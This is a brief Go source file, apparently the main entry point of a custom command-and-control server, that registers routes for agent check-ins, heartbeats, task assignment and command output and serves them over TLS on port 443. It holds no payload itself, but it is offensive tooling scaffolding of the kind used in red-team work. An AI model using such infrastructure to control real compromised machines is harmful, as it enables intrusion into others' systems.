package main

import (
	"log"
	"net/http"

	"customgoc2/routes"
)

func main() {
	mux := http.NewServeMux()

	mux.HandleFunc("/", routes.HandleDashboard)
	mux.HandleFunc("/agents", routes.HandleAgents)
	mux.HandleFunc("/heartbeat/", routes.HandleHeartbeat)
	mux.HandleFunc("/checkin/", routes.HandleCheckin)
	mux.HandleFunc("/output/", routes.HandleOutput)
	mux.HandleFunc("/get_output/", routes.HandleGetOutput)
	mux.HandleFunc("/task/", routes.HandleTask)
	mux.HandleFunc("/agent/", routes.HandleAgentView)

	fs := http.FileServer(http.Dir("static"))
	mux.Handle("/static/", http.StripPrefix("/static/", fs))

	log.Println("[+] Listening on :443")
	err := http.ListenAndServeTLS(":443", "cert.pem", "key.pem", mux)
	if err != nil {
		log.Fatal("[-] Failed to start server:", err)
	}
}
